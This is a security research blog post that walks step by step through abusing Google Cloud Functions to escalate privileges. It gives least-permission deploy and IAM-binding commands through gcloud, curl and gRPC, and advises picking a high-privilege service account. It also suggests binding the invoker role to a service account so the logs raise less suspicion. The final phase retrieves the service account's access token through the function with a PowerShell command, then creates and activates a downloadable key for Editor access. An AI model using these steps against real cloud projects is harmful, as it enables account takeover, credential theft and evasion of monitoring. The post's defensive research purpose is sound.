# GCP Cloud Function Abuse Research
[CLOUD FUNCTION UPDATE]
- [Phase I - Ways to Deploy a Cloud Function in Google Cloud Platform](#phase-i---ways-to-deploy-a-cloud-function-in-gcp)
  - [Ways to upload code in Cloud Function](#ways-to-upload-code-in-cloud-function-in-gcp)
  - [Permission Required for Deploying a Cloud Function via gCloud](#permission-required-for-deploying-a-cloud-function-via-gcloud)
    - [Deploying a Cloud Function via gCloud](#deploying-a-cloud-function-via-gcloud) 
  - [Permission Required for Deploying a Cloud Function via  Cloud Function API (gRPC & REST)](#permission-required-for-deploying-a-cloud-function-via-cloud-function-api-grpc--rest)
    - [Deploying a Cloud Function via Cloud Function API (gRPC)](#deploying-a-cloud-function-via-cloud-function-api-grpc)
    - [Deploying a Cloud Function via Cloud Function API (REST)](#deploying-a-cloud-function-via-cloud-function-api-rest)
- [Phase II - Ways to Set IAM Policy Binding to a Cloud Function in Google Cloud Platform](#phase-ii---ways-to-set-iam-policy-binding-to-a-cloud-function-in-google-cloud-platform)
  - [Permission Required to Set IAM Policy Binding to a Cloud Function](#permission-required-to-set-iam-policy-binding-to-a-cloud-function)
    - [Setting IAM Policy Binding to the Cloud Function via gCloud](#setting-iam-policy-binding-to-the-cloud-function-via-gcloud)
    - [Setting IAM Policy Binding to the Cloud Function via Cloud Function API (REST)](#setting-iam-policy-binding-to-the-cloud-function-via-cloud-function-api-rest)
    - [Setting IAM Policy Binding to the Cloud Function  via Cloud Function API (gRPC)](#setting-iam-policy-binding-to-the-cloud-function-via-cloud-function-api-grpc)
- [Phase III - Privilege Escalating via Cloud Function in Google Cloud Platform](#phase-iii---privilege-escalating-via-cloud-function-in-google-cloud-platform)
  - [Deploying the Cloud Function via Cloud Function API (gRPC)](#deploying-the-cloud-function-via-cloud-function-api-grpc)
  - [Setting IAM Policy Binding to the Cloud Function via Cloud Function API (gRPC)](#setting-iam-policy-binding-to-the-cloud-function-via-cloud-function-api-grpc-1)
  - [Escalating Privilege to a high level Service Account](#escalating-privilege-to-a-high-level-service-account)

## Phase I - Ways to Deploy a Cloud Function in GCP

There are three ways to deploy a Cloud Function in GCP: 

1. Cloud Console
2. gCloud Command
3. Cloud Function API (REST & gRPC)

While Cloud Console may seem user-friendly for creating resources in GCP, we won't be using it. The reason being, creating resources in GCP often involves navigating through different pages, each with its own set of permissions. Depending on the user's level of access, they may not be able to view or access certain pages necessary to create a particular resource. It's important to have a number of permissions in place to ensure that a user can perform the actions they need to within the GCP environment. 

Our focus in this blog is on creating a Cloud Function using the least privileges possible. That's also the reason why attackers tend to use the gCloud command and Cloud Function API (via gRPC or REST) to create resources. Furthermore, attackers mainly gain access to a GCP environment using stolen or compromised authentication tokens (auth_tokens). Cloud Console doesn't support authentication via auth_tokens. As a result, attackers may prefer to use the gCloud command or directly call the Cloud Function API via gRPC or REST API to create resources because they offer more flexibility in terms of authentication and control.

### Ways to upload code in Cloud Function in GCP

If you're creating a Cloud Function in GCP, you can use **Cloud Console, gCloud Command, **or** Cloud Function API** to do so. Regardless of the method you choose, you will need to upload the code into the Cloud Function. There are three different ways to upload the code:

1. Local Machine
2. Cloud Storage
3. Cloud Repository

<p><img src="https://github.com/anrbn/blog/blob/main/images/7.jpg"></p>

### Permission Required for Deploying a Cloud Function (via gCloud)

Let's start with the first step of deploying/creating a Cloud Function. As always every action in GCP requires you to have a certain amount of Permissions. 
#### Here's the list of least number of permissions that's required to "Deploy a Cloud Function via gCloud"

<table>
  <tr>
   <td colspan="3" align="center"><strong>Cloud Function Deploy via gCloud</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Function Code Upload Source: Local Machine</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Storage (Different Project)</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Repository
(Different Project)</strong>
   </td>
  </tr>
  <tr>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.get
   </td>
   <td>cloudfunctions.functions.get
   </td>
   <td>cloudfunctions.functions.get
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.sourceCodeSet
   </td>
   <td>
   </td>
   <td>source.repos.get (Google Cloud Functions Service Agent)
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
   <td>source.repos.list (Google Cloud Functions Service Agent)
   </td>
  </tr>
</table>

Here's an image to understand it better.

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/8.jpg">
</p>

> Note: 
>1. Different Project means the Source Code is uploaded to a Cloud Storage / Repository of a project different than the one being exploited. It is the attacker controlled project where the attacker has full control.
>2. Last two permissions in bottom right (`source.repos.get` & `source.repos.list`) are required to be granted to the "Google Cloud Functions Service Agent" in Attacker's controlled project for it to be able to read the repository from attacker's project and upload the code in the Function. 
>3. The format of the service account email for the Google Cloud Functions Service Agent is `service-{PROJECT_NUMBER}@gcf-admin-robot.iam.gserviceaccount.com`. Figuring out the Google Cloud Functions Service Agent email requires one to know the Project Number, which might need additional permissions. 

### Deploying a Cloud Function via gCloud

<table>
  <tr>
   <td colspan="3" align="center"><strong>Command to Deploy Cloud Function via gCloud</strong></td>
  </tr>
  <tr>
   <td><strong>Source Code Upload via: Local Machine</strong></td>
   <td>gcloud functions deploy &lt;function-name> --runtime=python38 --source=. --entry-point=&lt;function-entrypoint> --trigger-http --service-account=&lt;service-account-email></td>
   </tr>
   
<tr>
  <td><strong>Source Code Upload via: Cloud Storage</strong></td>
   <td>gcloud functions deploy &lt;function-name> --runtime=python38 --source=&lt;gs-link-to-zipped-sourcecode> --entry-point=&lt;function-entrypoint> --trigger-http --service-account=&lt;service-account-email></td>
 </tr>
  <tr>
 <td><strong>Source Code Upload via: Cloud Repository</strong></td>
 <td>gcloud functions deploy &lt;function-name> --runtime=python38 --source=&lt;gs-link-to-zipped-sourcecode> --entry-point=&lt;function-entrypoint> --trigger-http --service-account=&lt;service-account-email></td>
 </tr>
</table>

>Note: You might encounter an Error: "*ERROR: (gcloud.functions.deploy) ResponseError: status=[403], code=[Ok], message=[Permission 'cloudfunctions.operations.get' denied on resource 'operations/bzQ2MjAvdXMtY2VudHJhbDEvZXhmaWwxL18yTjJSYkp6alBB' (or resource may not exist).]*". Don't worry about it, the Cloud Function will be created regardless without any errors.  

Here's the deployment of cloud function via gCloud deploy command in action

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/18.png">
</p>

Every permission mentioned in the [list](#heres-the-list-of-least-number-of-permissions-thats-required-to-deploy-a-cloud-function-via-gcloud) seems to do something which is quite clear from their name. But here's something I found really strange, why is there a need for  `cloudfunctions.functions.get` permission for creating a Cloud Function? As far as the documentation goes the description for the permission `cloudfunctions.functions.get` says view functions. ([Link](https://cloud.google.com/functions/docs/reference/iam/permissions))

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/1.JPG">
</p>

Which means `cloudfunctions.functions.get` permission allows a user or service account to view metadata about a Cloud Function, such as its name, runtime, entry point, trigger settings, and other configuration details. What I guess is, it may be a default behavior of gCloud to include this permission when creating a function but it is not necessary for the creation of the function.

Using tools like gCloud can be convenient, but sometimes gCloud requires additional permissions beyond what is actually needed for the task at hand as you saw above. This can result in unnecessarily permission requirements for users. 

When a command is executed, gCloud translates the command into an API request and sends it to respective APIs underneath (Cloud Function API, Compute Engine API etc). The API then processes the request, creates or updates the respective resource, and sends back a response, which gcloud displays in your terminal.

One way to narrow down the permission requirements is to not rely on tools like gCloud to communicate with the APIs at all, but to use communicate with the APIs ourself. 
APIs can be called via gRPC and REST APIs and can make the process much more precise and efficient in terms of permissions to create resources like Cloud Functions, Compute Engine etc. gRPC and REST API allows us to specify only the necessary permissions for the specific task not more not less.

Let's see how we can do it.

### Permission Required for Deploying a Cloud Function via Cloud Function API (gRPC & REST)

<table>
  <tr>
   <td colspan="3" align="center"><strong>Cloud Function Deploy via Cloud Function API (gRPC & REST)</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Function Code Upload Source: Local Machine</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Storage</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Repository</strong>
   </td>
  </tr>
  <tr>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.sourceCodeSet
   </td>
   <td>
   </td>
   <td>source.repos.get (Google Cloud Functions Service Agent)
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
   <td>source.repos.list (Google Cloud Functions Service Agent)
   </td>
  </tr>
</table>

Here's an image to understand it better.

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/9.jpg">
</p>
  
>Note: You might need additional permissions to successfully upload code from the two sources: Local Machine and Cloud Repository via Cloud Function API (gRPC & REST).  However, for the Source: Cloud Storage, the permissions listed are the least that's required. Since it's easier to do it via Cloud Storage, why even bother with the other two? :)

Notice, how when we use Cloud Function API we dont' need any additional permissions (in our case: cloudfunctions.functions.get). We only need the permissions that required for the task. While in case of gCloud we need to have the additional permission (in our case: cloudfunctions.functions.get), although they were not required.

If you take a look at the image below, it's clear that of the two methods for deploying a Cloud Function (gCloud and Cloud Function API), Cloud Function API's path requires the least amount of permissions and can easily be chosen over any other method. This is another reason why attackers would tend to use this method rather than relying on gCloud.

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/19.1.jpg">
</p>

Let's call the Cloud Function API using both gRPC and REST to deploy a Cloud Function (Code Upload Source: Cloud Storage). 

### Deploying a Cloud Function via Cloud Function API (gRPC)

gRPC is an open-source Remote Procedure Call (RPC) framework developed by Google. Won't go into much details of gRPC and step straight into the point.

Here's a little tool I made that uses gRPC to communicate with the Cloud Function API and perform various tasks on Cloud Functions such as deployment, updatation, setting IAM Binding etc all while using the lowest privileges possible.

We will be utilizing this tool to accomplish all related tasks pertaining to Cloud Function and gRPC all through this blog. Before we deploy the function, let's check the permission the user holds first.

```powershell
py.exe .\main.py --project-id <project-id> --checkperm
```
<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/20.1.png">
</p>

We only have two permissions ( `iam.serviceAccounts.actAs` & `cloudfunctions.functions.create` ) as you can see above, that's enough for us to deploy a Cloud Function. For every action this tool communicates to Cloud Function API via gRPC (not REST). For uploading the Source Code to the Cloud Function, Cloud Storage is being used as it takes the least permission.

Next, we will deploy the function. 
```powershell
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function-name> --gsutil-uri <gsutil-uri> --function-entry-point <entry-point> --service-account <sa-account> --deploy
```
<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/22.png">
</p>

Even though a warning pops up that "*Permission cloudfunctions.operations.get denied*" the Cloud Function will be successfully created. The warning is likely due to some internal operations being performed by the Cloud Function service during the creation process.  

### Deploying a Cloud Function via Cloud Function API (REST)

Here's another way to call the Cloud Function API using REST. Below is a curl command which makes HTTP POST request to the Google Cloud Functions API to create a new Cloud Function using required parameters. 

```shell
curl -X POST \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"name":"projects/<project-id>/locations/<region>/functions/<function-name>","entryPoint":"<function-entrypoint>","runtime":"python38","serviceAccountEmail":"<service-account-email>","sourceArchiveUrl":"<gs-link-to-zipped-sourcecode>","httpsTrigger":{}}' \
  https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions?alt=json

```
Here's the oneliner which can run in `cmd` without any errors.

```shell
curl -X POST -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"name\":\"projects/<project-id>/locations/<region>/functions/<function-name>\",\"entryPoint\":\"<function-entrypoint>\",\"runtime\":\"python38\",\"serviceAccountEmail\":\"<service-account-email>\",\"sourceArchiveUrl\":\"<gs-link-to-zipped-sourcecode>\",\"httpsTrigger\":{}}" https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions?alt=json
```

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/23.png">
</p>

Modify the parameters according to your need

<table>
  <tr>
   <td>&lt;token> 
   </td>
   <td>&lt;token> is a placeholder for an actual authorization token that is required to authenticate and authorize the API request. Run the command 
"**gcloud auth application-default print-access-token**" to get the token.
   </td>
  </tr>
  <tr>
   <td>&lt;project-id>
   </td>
   <td>The ID of the Google Cloud project in which the Cloud Function will be created.
   </td>
  </tr>
  <tr>
   <td>&lt;region>
   </td>
   <td>The region where the Cloud Function will be deployed. For example, "us-central1".
   </td>
  </tr>
  <tr>
   <td>&lt;function-name>
   </td>
   <td>The name of the Cloud Function being created.
   </td>
  </tr>
  <tr>
   <td>&lt;function-entrypoint>
   </td>
   <td>The name of the entry point function for the Cloud Function. This is the function that will be executed when the Cloud Function is triggered.
   </td>
  </tr>
  <tr>
   <td>&lt;service-account-email>
   </td>
   <td>The email address of the service account that will be used to run the Cloud Function. Choosing a Service Account with high privileges will help you Privilege Escalate easier.
   </td>
  </tr>
  <tr>
   <td>&lt;gs-link-to-zipped-sourcecode>
   </td>
   <td>The URL of the Cloud Storage archive file that contains the source code for the Cloud Function. The archive file must be in ZIP format. Example: gs://bucket-name/code.zip
   </td>
  </tr>
</table>

However, invoking the function will lead to the following error: *Your client does not have permission to get URL.* 
<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/24.png">
</p>

## Phase II - Ways to Set IAM Policy Binding to a Cloud Function in Google Cloud Platform

Creating/Deploying a Cloud Function is just the first step in the process. Making it available for invocation is the second.

When you create a Cloud Function in GCP, it is not immediately accessible for invocation. Before you can invoke the function, you need to set up the necessary IAM permissions to allow access to the function and control who has access to your Cloud Function and what they can do with it.

To set up IAM permissions for your Cloud Function, you can add one or more members to a Cloud Function's IAM policy. Members can be individual user accounts, groups of users, or service accounts. You can assign roles to these members, which determine the actions they can perform on the function. 

Now, there's a special member called `allUsers` that represents anyone on the internet. You can grant the member : `allUsers` the role : `Cloud Function Invoker`. This will allow anyone on the internet to invoke the Cloud Function without requiring authentication. However we'll stick to giving a specific service account the permission `Cloud Function Invoker`. 
Invoking a Cloud Function using the `allUsers` binding, the function's logs will show the request came from an unauthenticated source, making it suspicious in some cases. On the other hand, if a service account is used, the logs will show request coming from an authorized source, reducing any suspicion.

### Permission Required to Set IAM Policy Binding to a Cloud Function

In order to grant the "Principals" a "Role", the user or service account performing the operation must have the certain permissions as listed in the table below. 
Here's the list of least number of permissions that's required to give a member or group the role `Cloud Function Invoker` to Invoke a Cloud Function (gCloud & Cloud Function API):

<table>
  <tr>
   <td colspan="3" align="center"><strong>Cloud Function Invoke via gCloud</strong></td>
  </tr>
  <td>cloudfunctions.functions.getIamPolicy</td>
  <tr>
  <td>cloudfunctions.functions.setIamPolicy</td>
</table>

<table style="float: left">
  <tr>
   <td colspan="3"align="center"><strong>Cloud Function Invoke via Cloud Function API (REST & gRPC)</strong></td>
  </tr>
  <td>cloudfunctions.functions.setIamPolicy</td>
</table>

Here's an image to understand it better.

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/10.jpg">
</p>

Once again Cloud Function API (REST & gRPC) stands out as it requires less amount of permission to give a member or group the role `Cloud Function Invoker` to Invoke a Cloud Function. 

### Setting IAM Policy Binding to the Cloud Function via gCloud

Anyways here's the gCloud command that grants `Cloud Function Invoker` role to a member/group. 

```shell
gcloud functions add-iam-policy-binding <function-name> --region=<region> --member=allUsers --role=roles/cloudfunctions.invoker
```
<table>
 <tr>
   <td>&lt;function-name>
   </td>
   <td>The name of the Cloud Function created.
   </td>
  </tr>
  <tr>
   <td>&lt;region>
   </td>
   <td>The region where the Cloud Function was deployed. For example, "us-central1".
   </td>
  </tr>
  </table>

Above gCloud command grants the principal:"allUsers" the role:"Cloud Function Invoker", it binds the Policy to the resource:"Google Cloud Functions" , allowing all users, even unauthenticated 
(--member=allUsers) to invoke the specified function (&lt;function-name>) in the specified region (--region=&lt;region>). It requires you to have both `cloudfunctions.functions.getIamPolicy` & `cloudfunctions.functions.setIamPolicy` permissions. We can narrow down the permission to just one, using Cloud Function API.

### Setting IAM Policy Binding to the Cloud Function via Cloud Function API (REST)

curl command that binds the policy principal:"allUsers" and role:"Cloud Function Invoker" to a Cloud Function:
  
```shell
curl -X POST \
     -H "Authorization: Bearer <token>" \
     -H "Content-Type: application/json" \
     -d '{
          "policy": {
            "bindings": [
              {
                "role": "roles/cloudfunctions.invoker",
                "members": [
                  "allUsers"
                ]
              }
            ],
            "version": 3
          }
        }' \
     https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>:setIamPolicy
```
Here's the oneliner which can run in `cmd` without any errors.

```shell
curl -X POST -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"policy\":{\"bindings\":[{\"role\":\"roles/cloudfunctions.invoker\",\"members\":[\"allUsers\"]}],\"version\":3}}" https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>:setIamPolicy
```
>Note: You can't input a Service Account in place of allUsers as principal name and expect it to work because in GCP IAM, members are identified using a prefix that specifies the type of the member, such as user: for a Google account, group: for a Google group, or serviceAccount: for a service account. Thus when a specific service account is being added in the policy it should have a prefix "serviceAccount" same goes for user and group.

curl command that binds the policy principal:"<service-account>" and role:"Cloud Function Invoker" to a Cloud Function:

```shell
curl -X POST \
     -H "Authorization: Bearer <token>" \
     -H "Content-Type: application/json" \
     -d '{
          "policy": {
            "bindings": [
              {
                "role": "roles/cloudfunctions.invoker",
                "members": [
                  "serviceAccount:<service-account>"
                ]
              }
            ],
            "version": 3
          }
        }' \
     https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>:setIamPolicy
```
Here's the oneliner which can run in `cmd` without any errors.

```shell
curl -X POST -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"policy\":{\"bindings\":[{\"role\":\"roles/cloudfunctions.invoker\",\"members\":[\"serviceAccount:<service-account>\"]}],\"version\":3}}" https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>:setIamPolicy
```

Modify the parameters according to your need

<table>
  <tr>
   <td>&lt;token> 
   </td>
   <td>&lt;token> is a placeholder for an actual authorization token that is required to authenticate and authorize the API request. 
   <br>Run the command "<strong>gcloud auth application-default print-access-token</strong>" to get the token.
   </td>
  </tr>
  <tr>
   <td>&lt;project-id>
   </td>
   <td>The ID of the Google Cloud project in which the Cloud Function was created.
   </td>
  </tr>
  <tr>
   <td>&lt;region>
   </td>
   <td>The region where the Cloud Function was deployed.
   </td>
  </tr>
  <tr>
   <td>&lt;function-name>
   </td>
   <td>The name of the Cloud Function.
   </td>
  </tr>
  <tr>
   <td>&lt;service-account>
   </td>
   <td>The name of the Service Account to grant "Cloud Function Invoke" role.
   </td>
  </tr>
</table>

### Setting IAM Policy Binding to the Cloud Function via Cloud Function API (gRPC)

We'll be using the tool to add the IAM policy binding of principal:"allUsers/Service Account" and role:"Cloud Function Invoker" to the Cloud Function. The tool will set the IAM Binding successfully only if you're passing a Service Account as prinicpal or passing "allUsers". 

```powershell
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function> --setiambinding <principal>
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function> --setiambinding allUsers
```
<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/28.png">
</p>
<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/27.png">
</p>
  
## Phase III - Privilege Escalating via Cloud Function in Google Cloud Platform
To Privilege Escalate via Cloud Function in Google Cloud Platform we'll be taking the path with least privileges possible. 
- Deploying the Cloud Function
  - Identify how you'd to **Upload the Source Code** & via which method.
    - Ways to upload the Source Code: Local Machine, Cloud Storage, Cloud Repository
    - Methods Available: gCloud, Cloud Function API (gRPC/REST)
- Setting IAM Policy Binding to the Cloud Function
  - Identify how you'd **Set the IAM Policy Binding to the Cloud Function**.
    - Methods Available: gCloud, Cloud Function API (gRPC/REST)

**Deploying the Cloud Function**: We'll deploy the Cloud Function by setting the Source Code from Cloud Storage via the Cloud Function API (gRPC) as it requires the least privileges.

**Setting IAM Policy Binding to the Cloud Function**: We'll set the IAM Policy Binding to the Cloud Function via Cloud Function API (gRPC) as it's the one that does it with least permissions than others.

>Note: One can use either gRPC or REST to make requests to the Cloud Function API, the Cloud Function API will then interact with the Cloud Functions service. The Permissions required to Deploy and Set IAM Policy Binding are same for both gRPC and REST.

These are the permissions required for the overall task:
- `iam.serviceAccounts.actAs`
- `cloudfunctions.functions.create`
- `cloudfunctions.functions.setIamPolicy`

### Deploying the Cloud Function via Cloud Function API (gRPC)

1. Create a new role and add the following permissions to it.
- `iam.serviceAccounts.actAs`
- `cloudfunctions.functions.create`
- `cloudfunctions.functions.setIamPolicy`

2. I created two different roles but you can put the three permissions in one role.
<p float="left">
<img src="https://github.com/anrbn/blog/blob/main/images/13.JPG" width="500" />
<img src="https://github.com/anrbn/blog/blob/main/images/12.JPG" width="500" /> 
<img src="https://github.com/anrbn/blog/blob/main/images/11.png" width="1000" /> 
</p>

3. With the roles set, its time we upload the Source Code to Cloud Storage in a separate account (Attacker Controlled account). Upload the following ZIP file [function.zip](https://github.com/anrbn/blog/blob/main/code/function.zip) to the Cloud Storage. Copy the GS URL and update line No. 7 of the below code. (Point 4)  

>The code will query the metadata server and retrieve an access token for the default service account and then print that token to response body when a request is made to that specific endpoint.

4. With the code uploaded to Cloud Storage let's Deploy the Cloud Function. We'll use the following script [grpc-deploy-storage.py](https://github.com/anrbn/blog/blob/main/code/grpc-deploy-storage.py) for that.

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/14.1.png">
</p>

5. Next up we'll move to "Setting IAM Policy Binding to the Cloud Function via Cloud Function API (gRPC)"

### Setting IAM Policy Binding to the Cloud Function via Cloud Function API (gRPC)

1. Set the IAM Policy Binding to the Cloud Function via this script [grpc-setiampolicy.py](https://github.com/anrbn/blog/blob/main/code/grpc-setiampolicy.py).

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/15.1.png">
</p>

2. `curl` the endpoint to get the access token. (Output of `grpc-deploy-storage.py` will give you the endpoint to query, note the "Function Invocation URL: ") 

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/16.png">
</p>

### Escalating Privilege to a High Level Service Account

With the access to the *access_token* what can we do? Well, a lot. One being authenticating and accessing various GCP APIs, services and resources, such as Google Cloud Storage, Google Cloud Compute Engine, and Google Kubernetes Engine etc. Here's an argument (--access-token-file) you can use with gCloud after you've gotten access to the *access_token*. Put the *access_token* in a file and specify it with the argument '--access-token-file' with gcloud. The *access_token* will allow you to perform actions and access resources in GCP as the user or service account associated with the token. 

Below is a Powershell Command that will put the the *access_token* into a txt file, to be used later with gCloud.

```powershell
$response = Invoke-WebRequest -Uri "https://us-east1-nnnn-374620.cloudfunctions.net/exfil11" -UseBasicParsing
$jsonResponse = $response | ConvertFrom-Json
$accessToken = $jsonResponse.access_token
$accessToken | Out-File -FilePath "code.txt"
```
Example Usage:

```shell
gcloud projects list --access-token-file=code.txt
gcloud projects list --access-token-file=C:\Users\Administrator\code.txt
```
>You might encounter an error *"ERROR: gcloud crashed (UnicodeDecodeError): 'utf-8' codec can't decode byte 0xff in position 0: invalid start byte"* if you use the above command. This has something to do with the gCloud version in use.

The better way next after getting the *access_token* would be to download the Service Account Key (the Service Account you just compromised) in JSON format. Use the python script [rest-createserviceaccountkey.py](https://github.com/anrbn/blog/blob/main/code/rest-createserviceaccountkey.py), it'll create a new JSON Key and download it. 

Once you've downloaded the JSON Key file for the Service Account you can authenticate and activate it via gCloud. 

Command to Activate the Service Account via gcloud:

```shell
gcloud auth activate-service-account --key-file="C:/Users/Administrator/Downloads/service_account.json" 
```
<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/17.png">
</p>

After you've activated the Service Account, you can now run commands as the activated service account user. Since the Service Account has Editor level permission one can perform a wide range of actions on Google Cloud resources.
